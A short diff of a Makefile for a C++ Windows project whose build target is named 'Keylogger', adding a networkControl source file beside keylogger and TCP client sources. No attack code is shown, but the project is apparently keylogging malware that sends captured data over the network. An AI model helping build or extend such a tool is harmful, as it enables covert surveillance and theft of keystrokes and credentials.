@@ -3,7 +3,7 @@ CXXFLAGS = -Wall -std=c++17 -Iinclude
 LDFLAGS = -lws2_32
 TARGET = Keylogger
 
-SRCS = src/keylogger.cpp src/tcpClient.cpp
+SRCS = src/keylogger.cpp src/tcpClient.cpp src/networkControl.cpp
 OBJS = $(SRCS:.cpp=.o)
 
 $(TARGET): $(OBJS)
